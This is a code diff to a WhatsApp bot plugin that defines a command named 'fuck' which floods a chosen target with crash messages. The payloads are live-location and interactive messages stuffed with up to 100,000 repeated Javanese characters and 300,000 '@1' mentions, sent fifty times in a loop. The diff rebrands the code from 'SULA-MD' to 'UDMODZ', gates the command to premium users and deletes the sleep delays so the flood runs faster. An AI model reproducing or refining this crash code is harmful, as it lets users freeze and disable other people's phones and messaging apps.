@@ -2,7 +2,6 @@ const { fetchJson } = require('../lib/functions')
 const config = require('../config')
 const { cmd, commands } = require('../command')
 
-
 cmd({
     pattern: "fuck",
     react: "💥",
@@ -12,7 +11,7 @@ cmd({
     filename: __filename
 }, async (conn, mek, m, { from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply }) => {
     try {
-        if (!isOwner) {
+        if (!isPremium) {
             return reply("❌ This command is for premium users only.");
         }
         if (!q) {
@@ -27,7 +26,7 @@ async function ngeloc(target, quoted) {
             "liveLocationMessage": {
                 "degreesLatitude": "p", 
                 "degreesLongitude": "p", 
-                "caption": `𝐒𝐔𝐋𝐀-𝐌𝐃` + "ꦾ".repeat(50000),
+                "caption": `𝗨𝗗𝗠𝗢𝗗𝗭` + "ꦾ".repeat(50000),
                 "sequenceNumber": "0",
                 "jpegThumbnail": "" 
             }
@@ -60,12 +59,12 @@ async function func1(target) {
                 hasMediaAttachment: true,
             },
             body: {
-                text: "𝐒𝐔𝐋𝐀-𝐌𝐃" + "ꦹꦹꦹ".repeat(400)  
+                text: "𝗨𝗗𝗠𝗢𝗗𝗭" + "ꦹꦹꦹ".repeat(400)  
             },
             nativeFlowMessage: {},
             contextInfo: {
                 mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
-                groupMentions: [{ groupJid: "1@newsletter", groupSubject: " 𝐒𝐔𝐋𝐀-𝐌𝐃 " }]
+                groupMentions: [{ groupJid: "1@newsletter", groupSubject: " 𝗨𝗗𝗠𝗢𝗗𝗭 " }]
             }
         }
     };
@@ -78,7 +77,7 @@ async function func1(target) {
 
 
 async function DocBug(target) {
-    let virtex = "𝐒𝐔𝐋𝐀-𝐌𝐃"; 
+    let virtex = "💙𝗤𝗨𝗘𝗘𝗡 𝗨𝗗𝗠𝗢𝗗𝗭💙"; 
 
     const message = {
         groupMentionedMessage: {
@@ -102,12 +101,12 @@ async function DocBug(target) {
                         hasMediaAttachment: true
                     },
                     body: {
-                        text: "⚡𝐒𝐔𝐋𝐀-𝐌𝐃⚡" + "ꦾ".repeat(100000) + "@1".repeat(300000) 
+                        text: "⚡𝗤𝗨𝗘𝗘𝗡 𝗨𝗗𝗠𝗢𝗗𝗭⚡" + "ꦾ".repeat(100000) + "@1".repeat(300000) 
                     },
                     nativeFlowMessage: {},
                     contextInfo: {
                         mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"), 
-                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "𝐒𝐔𝐋𝐀-𝐌𝐃" }]
+                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "𝗨𝗗𝗠𝗢𝗗𝗭" }]
                     }
                 }
             }
@@ -123,9 +122,9 @@ async function DocBug(target) {
 }
         for (let i = 0; i < 50; i++) { 
             await func1(target);
-            await sleep(500);
+           
             await ngeloc(target);
-            await sleep(100);
+           
             await DocBug(target);
         }
 
